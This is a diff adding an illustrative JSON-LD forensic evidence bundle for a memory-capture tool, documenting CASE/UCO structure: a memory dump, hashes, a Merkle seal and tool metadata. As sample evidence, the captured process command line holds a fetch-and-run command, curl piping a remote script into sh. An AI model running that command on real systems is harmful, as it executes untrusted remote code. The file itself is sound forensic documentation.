@@ -1,0 +1,134 @@
+{
+  "_comment": [
+    "Reference shape of a Flight Recorder CASE/UCO bundle, for readers who want",
+    "to see the structure without running a capture. This file is documentation:",
+    "the exporter builds bundles programmatically in case_uco.go and validates",
+    "them before writing. Values below are illustrative.",
+    "",
+    "Namespace note: InvestigativeAction and ProvenanceRecord live in",
+    "case-investigation in the published CASE 1.3.0 ontology. Fields with no",
+    "home in the published ontology use the documented fr: extension namespace."
+  ],
+  "@context": {
+    "case-core": "https://ontology.caseontology.org/case/core/",
+    "case-investigation": "https://ontology.caseontology.org/case/investigation/",
+    "uco-core": "https://ontology.unifiedcyberontology.org/uco/core/",
+    "uco-observable": "https://ontology.unifiedcyberontology.org/uco/observable/",
+    "uco-action": "https://ontology.unifiedcyberontology.org/uco/action/",
+    "uco-tool": "https://ontology.unifiedcyberontology.org/uco/tool/",
+    "uco-types": "https://ontology.unifiedcyberontology.org/uco/types/",
+    "uco-identity": "https://ontology.unifiedcyberontology.org/uco/identity/",
+    "uco-vocabulary": "https://ontology.unifiedcyberontology.org/uco/vocabulary/",
+    "fr": "https://flightrecorder.dev/ontology/2026/01#",
+    "kb": "http://example.org/kb/",
+    "xsd": "http://www.w3.org/2001/XMLSchema#"
+  },
+  "@id": "kb:bundle-6f1c2b3a-4d5e-4f60-9a8b-7c6d5e4f3a2b",
+  "@type": "uco-core:Bundle",
+  "uco-core:name": "Flight Recorder capture 6f1c2b3a-4d5e-4f60-9a8b-7c6d5e4f3a2b",
+  "uco-core:description": "Volatile memory preserved from pod victim/victim-app (container 3f2b1c0d9e8a) after trigger \"curl_pipe_sh\"",
+  "uco-core:createdTime": { "@type": "xsd:dateTime", "@value": "2026-03-14T09:15:00.700Z" },
+  "case-core:specVersion": "1.3.0",
+  "@graph": [
+    {
+      "@id": "kb:memory-dump-6f1c2b3a",
+      "@type": "uco-observable:ObservableObject",
+      "uco-core:name": "Process memory dump (pid 48291)",
+      "uco-core:tag": ["CONFIDENTIAL"],
+      "fr:classification": "CONFIDENTIAL",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:memory-dump-6f1c2b3a-content-facet",
+          "@type": "uco-observable:ContentDataFacet",
+          "uco-observable:hash": [
+            {
+              "@id": "kb:memory-dump-6f1c2b3a-hash",
+              "@type": "uco-types:Hash",
+              "uco-types:hashMethod": { "@type": "uco-vocabulary:HashNameVocab", "@value": "SHA256" },
+              "uco-types:hashValue": { "@type": "xsd:hexBinary", "@value": "9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08" }
+            }
+          ],
+          "uco-observable:sizeInBytes": { "@type": "xsd:integer", "@value": "4194304" },
+          "uco-observable:mimeType": "application/octet-stream",
+          "uco-observable:isEncrypted": { "@type": "xsd:boolean", "@value": "true" },
+          "fr:compression": "zstd-3"
+        },
+        {
+          "@id": "kb:memory-dump-6f1c2b3a-acquisition-facet",
+          "@type": "fr:MemoryAcquisitionFacet",
+          "fr:regionCount": { "@type": "xsd:integer", "@value": "12" },
+          "fr:fullRegions": { "@type": "xsd:integer", "@value": "10" },
+          "fr:partialRegions": { "@type": "xsd:integer", "@value": "1" },
+          "fr:failedRegions": { "@type": "xsd:integer", "@value": "1" },
+          "fr:captureStatus": "partial",
+          "fr:acquisitionMethod": "process_vm_readv(2)",
+          "fr:targetProcessStopped": { "@type": "xsd:boolean", "@value": "false" },
+          "fr:redactionApplied": { "@type": "xsd:boolean", "@value": "false" }
+        }
+      ]
+    },
+    {
+      "@id": "kb:process-6f1c2b3a",
+      "@type": "uco-observable:Process",
+      "uco-core:name": "sh",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:process-6f1c2b3a-namespace-facet",
+          "@type": "fr:ProcessNamespaceFacet",
+          "fr:hostPID": { "@type": "xsd:integer", "@value": "48291" },
+          "fr:namespacePID": { "@type": "xsd:integer", "@value": "1" },
+          "fr:commandLine": "/bin/sh -c curl -s http://198.51.100.9/p.sh | sh"
+        }
+      ]
+    },
+    {
+      "@id": "kb:investigative-action-6f1c2b3a",
+      "@type": "case-investigation:InvestigativeAction",
+      "uco-core:name": "Volatile memory acquisition",
+      "case-investigation:startedTime": { "@type": "xsd:dateTime", "@value": "2026-03-14T09:15:00.180Z" },
+      "case-investigation:endedTime": { "@type": "xsd:dateTime", "@value": "2026-03-14T09:15:00.520Z" },
+      "uco-action:instrument": { "@id": "kb:tool-6f1c2b3a" },
+      "uco-action:result": [{ "@id": "kb:memory-dump-6f1c2b3a" }]
+    },
+    {
+      "@id": "kb:provenance-record-6f1c2b3a",
+      "@type": "case-investigation:ProvenanceRecord",
+      "uco-core:description": "Merkle tree over 4 KiB chunks, root signed with ECDSA P-256",
+      "uco-core:object": [{ "@id": "kb:memory-dump-6f1c2b3a" }],
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:provenance-record-6f1c2b3a-facet",
+          "@type": "fr:SealFacet",
+          "fr:merkleRoot": "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae",
+          "fr:merkleLeafCount": { "@type": "xsd:integer", "@value": "1024" },
+          "fr:merkleChunkBytes": { "@type": "xsd:integer", "@value": "4096" },
+          "fr:oddLeafPolicy": "duplicate_last",
+          "fr:signatureAlgorithm": "ecdsa-p256-sha256-asn1"
+        }
+      ]
+    },
+    {
+      "@id": "kb:tool-6f1c2b3a",
+      "@type": "uco-tool:Tool",
+      "uco-core:name": "flight-recorder",
+      "uco-tool:toolType": "Forensic Capture Tool",
+      "uco-tool:version": "0.1.0",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:tool-6f1c2b3a-build-facet",
+          "@type": "fr:BuildFacet",
+          "fr:binarySHA256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "fr:kernelVersion": "6.8.0-31-generic"
+        }
+      ]
+    },
+    {
+      "@id": "kb:rel-authenticates-6f1c2b3a",
+      "@type": "uco-core:Relationship",
+      "uco-core:source": { "@id": "kb:provenance-record-6f1c2b3a" },
+      "uco-core:target": { "@id": "kb:memory-dump-6f1c2b3a" },
+      "uco-core:kindOfRelationship": "Authenticates",
+      "uco-core:isDirectional": { "@type": "xsd:boolean", "@value": "true" }
+    }
+  ]
+}
